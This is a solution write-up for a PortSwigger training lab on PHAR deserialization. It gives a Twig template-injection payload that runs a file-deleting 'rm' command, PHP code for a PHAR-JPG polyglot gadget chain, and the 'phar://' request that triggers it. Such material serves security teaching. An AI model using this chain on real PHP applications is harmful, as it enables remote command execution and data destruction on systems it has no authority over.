# Lab 10 — Using PHAR deserialization to deploy a custom gadget chain

> **Expert** · [Official lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain)

**Entry point:** avatar upload (JPG only) served by
`/cgi-bin/avatar.php?avatar=` — the `phar://` stream wrapper triggers
deserialization of a PHAR's metadata.

## Solution

1. Upload a valid JPG; note `GET /cgi-bin/avatar.php?avatar=wiener`.
2. `GET /cgi-bin` lists `Blog.php` and `CustomTemplate.php`; read both via
   the tilde trick (`.php~`).
3. The gadget: `file_exists()` is called on `CustomTemplate->lockFilePath`,
   which comes from `Blog->desc` → inject an **SSTI payload** (Twig):
   `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}`
4. Build a **PHAR-JPG polyglot** containing this PHP:

```php
class CustomTemplate {}
class Blog {}
$object = new CustomTemplate;
$blog = new Blog;
$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
$blog->user = 'user';
$object->template_file_path = $blog;
```

(search "phar jpg polyglot" for a generator, or use PortSwigger's
ready-made script.)

5. Upload it as your avatar, then request:

```
GET /cgi-bin/avatar.php?avatar=phar://wiener
```

`file_exists()` on the PHAR stream deserializes the metadata → Twig SSTI →
command runs — lab solved.

## Notes

PHAR deserialization needs no upload rename flaw: any `file_exists` /
`filesize` / `is_dir` on an attacker-controlled path activates it.
